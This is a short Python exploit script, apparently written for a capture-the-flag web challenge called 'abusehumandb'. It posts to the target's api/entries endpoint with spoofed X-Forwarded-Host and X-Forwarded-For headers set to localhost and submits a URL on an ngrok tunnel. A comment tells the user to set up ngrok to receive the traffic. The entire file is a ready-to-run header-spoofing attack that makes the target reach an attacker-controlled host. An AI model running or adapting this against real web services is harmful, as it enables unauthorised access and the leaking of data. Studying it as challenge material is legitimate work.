#!/usr/bin/python3

import sys
import requests

def exploiting_abusehumandb(url):
    malicious_headers = {
            "X-Forwarded-Host":"127.0.0.1:1337",
            "X-Forwarded-For":"http://127.0.0.1:1337"
    }

    # you should to use ngrok to create a local service
    # with forwarding localhost

    malicious_url = "https://8f10-157-100-198-203.ngrok.io/"

    POST_URI = "api/entries"
    sess = requests.Session()
    ress = sess.post(url=url+POST_URI,
            json=
            {"url":malicious_url},
	    headers=malicious_headers
        )



def main():
    try:
        url = sys.argv[1]
        exploiting_abusehumandb(url)
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()
